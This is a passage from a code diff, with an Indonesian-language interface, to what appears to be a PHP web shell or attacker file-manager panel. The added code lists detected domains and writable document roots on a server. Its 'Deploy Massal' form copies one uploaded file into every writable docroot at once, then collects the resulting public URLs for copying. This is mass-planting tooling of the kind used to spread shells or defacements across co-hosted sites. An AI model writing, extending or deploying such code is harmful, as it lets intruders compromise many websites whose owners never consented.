+    <?php if ($detect_error !== ''): ?>
+        <div class="msg" style="color:#ff9da7;margin-top:10px;"><?php echo h($detect_error); ?></div>
+    <?php endif; ?>
+    <?php if ($domain_scan_done): ?>
+        <div style="margin-top:12px;">
+            <?php if (!$domain_rows): ?>
+                <div class="msg">Tidak ada domain/docroot yang terdeteksi. Tambah path scan lewat <code>$WID_SCAN_ROOTS</code>.</div>
+            <?php else: ?>
+                <div class="muted" style="margin-bottom:6px;">Terdeteksi <b style="color:#7ee787;"><?php echo count($domain_rows); ?></b> docroot:</div>
+                <table>
+                    <thead><tr><th>Domain</th><th>Docroot</th><th>Writable</th><th>Source</th></tr></thead>
+                    <tbody>
+                    <?php foreach ($domain_rows as $dr): ?>
+                        <tr>
+                            <td>
+                                <?php echo h($dr['domain']); ?>
+                                <?php if (!empty($dr['aliases'])): ?><br><small style="color:#8e99ab;"><?php echo h(implode(', ', $dr['aliases'])); ?></small><?php endif; ?>
+                                <?php if (!empty($dr['current'])): ?> <small style="color:#e3b341;">(aktif)</small><?php endif; ?>
+                            </td>
+                            <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($dr['docroot']); ?></td>
+                            <td><?php echo $dr['writable'] ? '<span style="color:#7ee787;">Ya</span>' : '<span style="color:#ff7b72;">Tidak</span>'; ?></td>
+                            <td style="font-size:11px;"><?php echo h($dr['source']); ?></td>
+                        </tr>
+                    <?php endforeach; ?>
+                    </tbody>
+                </table>
+            <?php endif; ?>
+        </div>
+    <?php endif; ?>
+</div>
+
+<div class="box">
+    <div class="name">Deploy Massal</div>
+    <div class="muted" style="margin-bottom:10px;">
+        Salin satu file ke semua docroot writable di hasil deteksi. Laporan per-target (dedupe per domain + per realpath).
+    </div>
+    <form method="post" enctype="multipart/form-data">
+        <input type="hidden" name="action" value="deploy_massal">
+        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
+        <input type="file" name="deploy_file" required>
+        <input type="submit" class="btn btn-red" value="Deploy" onclick="return confirm('Deploy file ini ke semua docroot writable?');">
+    </form>
+    <?php if ($deploy_done): ?>
+        <?php if ($deploy_summary !== ''): ?><div class="msg" style="margin-top:10px;"><?php echo h($deploy_summary); ?></div><?php endif; ?>
+        <?php if ($deploy_report): ?>
+            <?php $copyUrls = array(); foreach ($deploy_report as $cr) { if ($cr['url'] !== '-') $copyUrls[] = 'http://' . $cr['url']; } ?>
+            <?php if ($copyUrls): ?>
+                <div style="margin-top:8px;"><button type="button" class="btn" onclick="widCopyText(this, <?php echo h(json_encode(implode("\n", $copyUrls))); ?>, 'tersalin')">Salin Semua URL</button></div>
+            <?php endif; ?>
+            <div style="margin-top:10px;">
+                <table>
+                    <thead><tr><th>Domain</th><th>URL</th><th>Docroot</th><th>Status</th><th>Detail</th></tr></thead>
+                    <tbody>
+                    <?php foreach ($deploy_report as $rr): ?>
+                        <tr>
+                            <td><?php echo h($rr['domain']); ?></td>
+                            <td style="word-break:break-all;">
+                                <?php if ($rr['url'] !== '-'): ?>
+                                    <a href="http://<?php echo h($rr['url']); ?>" target="_blank" rel="noopener"><?php echo h($rr['url']); ?></a>
+                                    <button type="button" class="btn" onclick="widCopyText(this, <?php echo h(json_encode('http://' . $rr['url'])); ?>, 'tersalin')" style="padding:2px 6px;font-size:10px;">copy</button>
+                                <?php else: ?>-<?php endif; ?>
+                            </td>
+                            <td style="word-break:break-all;font-family:Consolas,monospace;font-size:11px;"><?php echo h($rr['docroot']); ?></td>
+                            <td><?php echo $rr['status'] === 'ok' ? '<span style="color:#7ee787;">OK</span>' : h($rr['status']); ?></td>
+                            <td style="font-size:11px;"><?php echo h($rr['detail']); ?></td>
+                        </tr>
+                    <?php endforeach; ?>
+                    </tbody>
+                </table>
+            </div>
+        <?php endif; ?>
+    <?php endif; ?>
+</div>
+<?php endif; ?>
 <?php if ($tab === 'info'): ?>
 <div class="box">
     <div class="name">Function &amp; Binary Check</div>
@@ -2013,7 +2631,24 @@ function toggleAll(source) {
     }
     toggleActionBar();
 }
-
+function widCopyFallback(text) {
+    var ta = document.createElement('textarea');
+    ta.value = text;
+    ta.style.position = 'fixed'; ta.style.opacity = '0';
+    document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); } catch (e) {}
+    document.body.removeChild(ta);
+}
+function widCopyText(btn, text, label) {
+    var finish = function () {
+        var oldLabel = btn.textContent;
+        btn.textContent = label;
+        setTimeout(function () { btn.textContent = oldLabel; }, 1200);
+    };
+    if (navigator.clipboard && window.isSecureContext) {
+        navigator.clipboard.writeText(text).then(finish, function () { widCopyFallback(text); finish(); });
+    } else { widCopyFallback(text); finish(); }
+}
 function toggleActionBar() {
     var bar = document.getElementById('batchActionBar');
     if (!bar) return;
